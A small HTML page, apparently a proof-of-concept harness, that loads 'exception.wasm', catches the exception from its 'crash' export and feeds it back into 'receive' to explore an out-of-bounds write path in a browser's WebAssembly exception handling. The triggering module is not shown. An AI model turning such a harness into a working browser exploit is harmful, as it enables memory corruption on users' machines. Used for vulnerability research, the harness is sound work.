<!DOCTYPE html>
<html>
<head><title>Wasm OOB Tester</title></head>
<body>
  <h1>Wasm OOB Write Path Explorer</h1>
  <pre id="output"></pre>

  <script>
    const log = (msg) => {
      document.getElementById("output").textContent += msg + "\n";
    };

    (async () => {
      const buf = await fetch("exception.wasm").then(r => r.arrayBuffer());
      const mod = await WebAssembly.compile(buf);
      const instance = await WebAssembly.instantiate(mod);

      try {
        instance.exports.crash();
      } catch (e) {
        log("Caught exception: " + e);

        try {
          instance.exports.receive(e);
          log("Back in Wasm — UnpackException ran!");
        } catch (inner) {
          log("Receive failed: " + inner);
        }
      }
    })();
  </script>
</body>
</html>
